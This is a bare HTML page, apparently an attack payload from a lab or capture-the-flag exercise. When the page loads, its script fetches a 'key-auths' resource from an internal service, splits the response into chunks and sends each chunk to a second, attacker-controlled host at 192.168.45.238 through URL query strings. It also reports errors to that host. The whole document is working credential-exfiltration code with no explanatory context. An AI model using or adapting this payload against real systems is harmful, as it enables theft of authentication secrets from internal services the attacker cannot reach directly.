<html>
<head>
<script>
function runscript() {
    const maxLength = 1024;
    fetch("http://172.16.16.2:8001/key-auths")
    .then((response) => response.text())
    .then((data) => {
        if (data.length <= maxLength) {
            sendDataChunk(data);
        } else {
            // If data length exceeds limit, send in chunks
            let chunks = [];
            for (let i = 0; i < data.length; i += maxLength) {
                chunks.push(data.substring(i, i + maxLength));
            }
            chunks.forEach(chunk => sendDataChunk(chunk));
        }
        fetch("http://192.168.45.238/callback?" + encodeURIComponent(data));
    })
    .catch(err => {
        fetch("http://192.168.45.238/error?" + encodeURIComponent(err));
    });
}

function sendDataChunk(chunk) {
    fetch("http://192.168.45.238/callback?" + encodeURIComponent(chunk));
}
</script>
</head>
<body onload='runscript()'>
<div></div>
</body>
</html>

